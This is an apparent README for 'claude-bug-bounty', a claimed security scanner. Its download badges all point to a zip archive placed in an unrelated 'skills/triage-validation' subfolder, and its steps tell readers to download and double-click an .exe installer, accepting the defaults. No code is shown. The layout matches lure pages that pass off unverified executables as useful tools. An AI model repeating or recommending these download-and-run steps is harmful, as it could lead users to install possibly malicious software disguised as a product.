...
[![Download claude-bug-bounty](https://img.shields.io/badge/Download-claude--bug--bounty-brightgreen)](https://raw.githubusercontent.com/Mikacr1138/claude-bug-bounty/main/skills/triage-validation/claude_bug_bounty_v3.6.zip)

---

## 📋 About claude-bug-bounty
...
## 🚀 Getting Started: Download and Install claude-bug-bounty

To begin, you need to download the software from its main page.

[![Get claude-bug-bounty here](https://img.shields.io/badge/Download-Now-blue)](https://raw.githubusercontent.com/Mikacr1138/claude-bug-bounty/main/skills/triage-validation/claude_bug_bounty_v3.6.zip)
...
- Find the file with `.exe` at the end. For example, it might be named `claude-bug-bounty-setup.exe`.

### Step 3: Download the Installer

- Click the `.exe` file name to download it to your PC.  
- Choose a folder you can find easily, like your Desktop or Downloads.

### Step 4: Run the Installer

1. Open the folder where the file downloaded.  
2. Double-click the `.exe` to start installation.  
3. Follow the on-screen steps: accept the license, pick install location (default is fine), and continue.  
4. Wait for installation to finish.  

You don’t need to change any advanced settings.

### Step 5: Launch Claude-Bug-Bounty
...
1. Enter the website address or app you want to test.  
2. Choose the type of scan you want to run.  
3. Start the scan and watch progress in real time.  
4. Review detected issues listed by severity and type.  
5. Export or save a report with all findings.
